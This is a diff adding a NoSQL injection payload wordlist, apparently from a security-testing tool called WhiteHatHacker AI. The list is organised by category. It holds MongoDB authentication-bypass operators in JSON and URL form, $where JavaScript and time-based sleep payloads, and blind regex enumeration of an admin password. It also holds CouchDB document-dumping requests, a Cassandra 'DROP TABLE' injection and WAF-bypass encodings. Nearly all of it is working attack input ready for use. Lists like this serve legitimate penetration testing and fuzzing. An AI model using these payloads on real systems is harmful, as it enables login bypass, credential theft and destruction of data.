@@ -1,0 +1,222 @@
+# ============================================================================
+# WhiteHatHacker AI — NoSQL Injection Payload Wordlist (Comprehensive)
+# Categories: MongoDB, CouchDB, Authentication Bypass, Data Extraction,
+#             Operator Injection, JavaScript Injection, Blind, WAF Bypass
+# Total: ~120 payloads
+# ============================================================================
+
+# --- MONGODB AUTH BYPASS (JSON body) ---
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$exists": true}}
+{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}
+{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
+
+# --- MONGODB AUTH BYPASS (URL params) ---
+username[$ne]=invalid&password[$ne]=invalid
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$ne]=invalid
+username=admin&password[$gt]=
+username=admin&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+username[$nin][]=invalid&password[$nin][]=invalid
+username[$in][]=admin&password[$gt]=
+
+# --- MONGODB OPERATOR INJECTION ---
+{"$where": "1==1"}
+{"$where": "this.username == 'admin'"}
+{"$gt": ""}
+{"$ne": ""}
+{"$lt": "z"}
+{"$gte": ""}
+{"$lte": "z"}
+{"$exists": true}
+{"$regex": ".*"}
+{"$regex": "^a"}
+{"$nin": [""]}
+{"$in": ["admin"]}
+{"$or": [{"a": 1}, {"b": 1}]}
+{"$and": [{"a": {"$gt": ""}}, {"b": {"$gt": ""}}]}
+
+# --- MONGODB JAVASCRIPT INJECTION ---
+{"$where": "sleep(5000)"}
+{"$where": "function(){sleep(5000);return true}"}
+{"$where": "this.password.match(/.*/)"}
+{"$where": "return true"}
+{"$where": "1"}
+{"username": {"$where": "return true"}}
+';sleep(5000);var x='
+';return true;var x='
+';sleep(5000);'
+1;sleep(5000)
+true;sleep(5000)
+
+# --- MONGODB DATA EXTRACTION (Blind regex) ---
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+{"username": "admin", "password": {"$regex": "^p"}}
+{"username": "admin", "password": {"$regex": "^pa"}}
+{"username": "admin", "password": {"$regex": "^pas"}}
+{"username": "admin", "password": {"$regex": "^pass"}}
+
+# --- MONGODB DATA EXTRACTION (Boolean-based) ---
+username=admin&password[$regex]=^a
+username=admin&password[$regex]=^b
+username=admin&password[$regex]=^.{1}
+username=admin&password[$regex]=^.{5}
+username=admin&password[$regex]=^.{10}
+
+# --- MONGODB TIME-BASED BLIND ---
+{"$where": "if(this.username=='admin'){sleep(5000);return true}else{return false}"}
+{"$where": "if(this.password.match(/^a/)){sleep(5000)}"}
+{"$where": "if(this.password.length>5){sleep(5000)}"}
+
+# --- MONGODB $LOOKUP / AGGREGATION ---
+{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "data"}}
+[{"$match": {}}, {"$project": {"password": 1}}]
+
+# --- COUCHDB INJECTION ---
+{"selector": {"_id": {"$gt": null}}, "fields": ["_id", "_rev", "password"]}
+{"selector": {"username": "admin"}, "fields": ["_id", "password"]}
+{"selector": {"$or": [{"_id": {"$gt": null}}]}}
+
+# --- URL ENCODED OPERATORS ---
+%24gt
+%24ne
+%24lt
+%24gte
+%24lte
+%24regex
+%24exists
+%24in
+%24nin
+%24where
+%24or
+%24and
+
+# --- HEADER/COOKIE INJECTION ---
+Cookie: session={"$gt": ""}
+Cookie: token={"$ne": ""}
+Authorization: {"$gt": ""}
+
+# --- WAF BYPASS ---
+{"username": {"$\u006ee": ""}, "password": {"$\u006ee": ""}}
+{"username": {"\u0024gt": ""}, "password": {"\u0024gt": ""}}
+{"username": {"$\x6ee": ""}, "password": {"$\x6ee": ""}}
+username[$ne]=&password[$ne]=
+username%5B%24ne%5D=&password%5B%24ne%5D=
+username%5B%24gt%5D=&password%5B%24gt%5D=
+
+# --- CONTEXT-SPECIFIC ---
+# in query parameter: id[$ne]=
+# in JSON body: {"id": {"$ne": ""}}
+# in search: {"q": {"$regex": ".*"}}
+# in filter: {"filter": {"$where": "1==1"}}
+{"search": {"$regex": ".*"}}
+{"q": {"$gt": ""}}
+{"filter": {"$exists": true}}
+{"sort": {"$natural": 1}}
+
+# ============================================================================
+# EXPANSION: Advanced NoSQL Injection ??? MongoDB, CouchDB, Cassandra
+# ============================================================================
+
+# --- MongoDB Operator Injection ---
+{"$gt":""}
+{"$ne":""}
+{"$gte":""}
+{"$lt":""}
+{"$lte":""}
+{"$nin":["admin"]}
+{"$in":["admin","root"]}
+{"$exists":true}
+{"$regex":"^a"}
+{"$regex":"^admin"}
+{"$regex":".*"}
+{"$eq":"admin"}
+{"$not":{"$eq":""}}
+{"$where":"1==1"}
+{"$where":"this.password.match(/.*/)"}
+
+# --- URL-encoded Operator Injection ---
+[$gt]=
+[$ne]=
+[$regex]=.*
+[$exists]=true
+[$nin][]=admin
+[$in][]=admin
+[$where]=1==1
+username[$ne]=&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$exists]=true&password[$exists]=true
+
+# --- $where JavaScript Injection ---
+{"$where":"sleep(5000)"}
+{"$where":"function(){sleep(5000);return true}"}
+{"$where":"this.a==this.b"}
+{"$where":"return true"}
+';sleep(5000);var x='
+';return true;var x='
+0;sleep(5000)
+0;return true
+a]};sleep(5000);a{[a
+
+# --- $regex Enumeration (Blind) ---
+{"$regex":"^a.*"}
+{"$regex":"^b.*"}
+{"$regex":"^ad.*"}
+{"$regex":"^adm.*"}
+{"$regex":"^admi.*"}
+{"$regex":"^admin.*"}
+{"$regex":"^.{1}$"}
+{"$regex":"^.{5}$"}
+{"$regex":"^.{10,}$"}
+
+# --- MongoDB Aggregation Pipeline Abuse ---
+[{"$match":{}},{"$group":{"_id":null,"count":{"$sum":1}}}]
+[{"$match":{}},{"$project":{"password":1}}]
+[{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"data"}}]
+[{"$unwind":"$data"}]
+
+# --- JSON Injection ---
+{"username":"admin","password":{"$gt":""},"$or":[{},{"a":"a"}]}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$regex":"^.*"}}
+{"username":"admin","$or":[{"a":1}]}
+{"$comment":"payload"}
+
+# --- CouchDB Injection ---
+_all_docs?startkey="a"&endkey="z"
+_all_docs?include_docs=true
+_design/
+_changes?include_docs=true
+_users/_all_docs
+{"_id": "_design/pwned","views":{"test":{"map":"function(doc){emit(doc._id,doc)}"}}}
+
+# --- Cassandra/ScyllaDB ---
+; DROP TABLE users;--
+' OR 1=1 ALLOW FILTERING--
+'; SELECT * FROM system.local;--
+
+# --- Authentication Bypass Payloads ---
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$ne":"wrong"}}
+{"username":"admin","password":{"$regex":".*"}}
+{"username":"admin","password":{"$exists":true}}
+{"username":{"$regex":"admin"},"password":{"$ne":""}}
+
+# --- Time-Based Blind ---
+{"$where":"var d=new Date();do{var cd=new Date();}while(cd-d<5000);return true;"}
+{"$where":"sleep(5000)||true"}
+{"$where":"(function(){var d=new Date();while(new Date()-d<5000){}return 1;})()"}
+
+# --- Type Juggling ---
+{"username":true,"password":true}
+{"username":null,"password":null}
+{"username":0,"password":0}
+{"username":[],"password":[]}
